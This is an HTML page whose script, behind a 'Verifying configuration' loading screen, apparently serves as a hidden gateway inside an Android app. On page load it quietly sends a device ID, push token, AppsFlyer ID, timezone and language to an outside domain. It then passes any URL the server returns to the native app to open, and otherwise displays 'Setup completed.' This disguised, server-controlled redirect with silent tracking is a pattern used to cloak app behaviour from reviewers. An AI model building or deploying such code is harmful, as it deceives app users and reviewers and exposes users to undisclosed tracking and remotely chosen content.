<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Configuring...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <style>
        /* Світлий Glassmorphism дизайн */
        body, html {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .glass-card {
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.8);
            border-radius: 24px;
            padding: 40px 60px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: all 0.4s ease;
        }

        /* Анімація крапок (Bouncing dots) */
        .dots-loader {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
        }

        .dots-loader div {
            width: 14px;
            height: 14px;
            background-color: #6366f1; /* Індиго */
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out both;
        }

        .dots-loader div:nth-child(1) { animation-delay: -0.32s; }
        .dots-loader div:nth-child(2) { animation-delay: -0.16s; }

        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }

        .status-text {
            color: #475569;
            font-size: 16px;
            font-weight: 500;
            margin: 0;
            letter-spacing: 0.3px;
        }

        /* Текст, що з'являється після завантаження */
        .ready-msg {
            color: #10b981;
            font-size: 16px;
            font-weight: 600;
            animation: fade-in 0.6s ease-out forwards;
        }

        @keyframes fade-in {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

<div class="glass-card" id="ui-box">
    <div class="dots-loader" id="loader-anim">
        <div></div><div></div><div></div>
    </div>
    <p class="status-text" id="status-message">Verifying configuration</p>
</div>

<script>
    // Твої константи
    const DOMAIN = "nunataktower.top";
    const BUNDLE = "stepup.app222shred.corpapp";

    // ООП-підхід: інкапсуляція всієї логіки в клас
    class GatewayEngine {
        constructor(domain, bundle) {
            this.endpoint = `https://${domain}/v1/public/install`;
            this.bundle = bundle;
            this.storageKey = "strtv_device_id";
        }

        _createUUID() {
            if (window.crypto && crypto.randomUUID) return crypto.randomUUID();
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
                const r = Math.random() * 16 | 0;
                return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
            });
        }

        _getDeviceId() {
            try {
                let id = localStorage.getItem(this.storageKey);
                if (!id) {
                    id = this._createUUID();
                    localStorage.setItem(this.storageKey, id);
                }
                return id;
            } catch (e) {
                return this._createUUID();
            }
        }

        _getEnvironment() {
            let tz = "", lang = "";
            try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ""; } catch(e) {}
            try { lang = navigator.languages?.[0] || navigator.language || ""; } catch(e) {}
            return { tz, lang };
        }

        _readNativeBridge() {
            try {
                if (window.AndroidIntegrations?.payload) {
                    const raw = window.AndroidIntegrations.payload();
                    return raw ? (JSON.parse(raw) || {}) : {};
                }
            } catch (e) {}
            return {};
        }

        _isValidUrl(val) {
            if (typeof val !== 'string' || !val.trim()) return false;
            try {
                const url = new URL(val.trim());
                return url.protocol === "http:" || url.protocol === "https:";
            } catch(e) {
                return false;
            }
        }

        _showNativeFallback() {
            const anim = document.getElementById("loader-anim");
            const msg = document.getElementById("status-message");

            if (anim) anim.remove();
            if (msg) {
                msg.className = "ready-msg";
                msg.innerText = "Setup completed.";
            }

            if (window.AndroidGateBridge) {
                window.AndroidGateBridge.contentLoaded();
            }
        }

        // Сучасний підхід async/await замість then/catch
        async execute() {
            const nativeData = this._readNativeBridge();
            const env = this._getEnvironment();

            const finalDevice = (typeof nativeData.device === "string" && nativeData.device.length)
                ? nativeData.device
                : this._getDeviceId();

            const requestBody = {
                bundle: this.bundle,
                device: finalDevice,
                fcm_token: nativeData.fcm_token || "",
                appsFlyerId: nativeData.appsFlyerId || "",
                timezone: env.tz,
                language: env.lang
            };

            try {
                const response = await fetch(this.endpoint, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(requestBody)
                });

                const data = await response.json();

                if (data && this._isValidUrl(data.url)) {
                    if (window.AndroidGateBridge) {
                        window.AndroidGateBridge.onLinkFound(data.url.trim());
                        return;
                    }
                }
                this._showNativeFallback();
            } catch (error) {
                this._showNativeFallback();
            }
        }
    }

    // Запуск після повного завантаження DOM
    document.addEventListener('DOMContentLoaded', () => {
        const engine = new GatewayEngine(DOMAIN, BUNDLE);
        // Невелика затримка для плавності UI
        setTimeout(() => engine.execute(), 200);
    });
</script>
</body>
</html>
